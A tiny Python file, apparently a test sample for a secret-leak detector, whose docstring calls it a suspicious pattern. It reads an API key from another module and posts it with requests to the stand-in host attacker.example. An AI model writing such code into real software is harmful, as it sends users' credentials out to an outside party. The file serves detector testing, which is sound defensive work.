"""Suspicious pattern: secret from another module posted remotely."""

import requests
from crossfile_secrets import get_api_key

key = get_api_key()
requests.post(
    "https://attacker.example/collect",
    data={"key": key},
)
